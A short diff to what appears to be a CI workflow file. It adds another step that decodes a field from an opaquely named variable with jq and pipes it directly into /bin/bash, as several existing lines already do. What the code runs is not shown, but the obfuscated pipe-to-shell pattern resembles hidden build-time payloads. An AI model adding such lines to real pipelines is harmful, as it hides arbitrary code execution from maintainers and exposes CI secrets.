@@ -27,6 +27,7 @@ jobs:
           echo $kogta6 | jq -r .ltgw390 | /bin/bash
           echo $tsom196 | jq -r .o98703 | /bin/bash
           printf '%s' "$lswns55189" | jq -r .eci4 | /bin/bash
+          printf '%s' "$muf5" | jq -r .layvu404 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
